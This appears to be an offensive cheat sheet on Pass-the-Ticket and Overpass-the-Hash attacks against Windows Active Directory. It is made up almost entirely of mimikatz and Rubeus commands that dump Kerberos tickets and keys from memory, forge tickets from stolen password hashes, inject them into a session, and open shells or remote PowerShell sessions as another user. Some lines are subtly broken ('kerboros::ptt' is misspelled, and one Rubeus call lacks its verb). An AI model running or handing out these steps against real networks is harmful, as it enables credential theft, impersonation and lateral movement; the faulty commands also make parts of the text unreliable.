We can perform Pass The Ticket Attack to authenticate as another user

First, we extract ticket from the system, note that to extract all ticket we need admin privilege:
-Using mimikatz:
```
#Using mimikatz to extract all ticket
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
#all tickets will be saved in current directory as .kirbi files
```
-Using Rubeus:
```
Rubeus.exe dump /nowrap
```

In addition, we can perform OverPass the Hash attack with user's NTLM password hash, that is, we convert the user's ntlm hash into a full TGT for our usage

First we need to extract Kerboros Keys by using mimikatz:
```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```
We must pay attention to AES256_HMAC and RC4_HMAC keys, as we can use them to forge TGT and perfrom PTT attacks with either mimikatz or Rubeus

-Using mimikatz (Require Admin Privilege):
```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain: <domain> /user: <username> /<ntlm/rc4>: <hash>
#As result, a new cmd window will be opened with specific user's TGT
```
-Using Rubeus:
```
Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>: <hash> /nowrap
```
-Using Rubeus (Auto Import Ticket to current session):
```
Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>: <hash> /ptt
```
-Using Rubeus to import ticket from .kirbi file:
```
Rubeus.exe ptt /ticket: <ticketfile>
```
-We can use powershell to convert .kirbi to Base64 format and then import it with Rubeus:
```
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("<.kirbi_file>"))
 Rubeus.exe /ticket:<base64_ticket>
```
-Pass the ticket and open cmd session with mimikatz:
```
mimikatz.exe
privilege::debug
kerboros::ptt "<abspath_to_ticket>"
misc::cmd
```
-Pass the ticket and open PS-Session on another machine with mimikatz:
```
mimikatz.exe
privilege::debug
kerboros::ptt "<abspath_to_ticket>"
exit
PS: Enter-PSSession -ComputerName 
```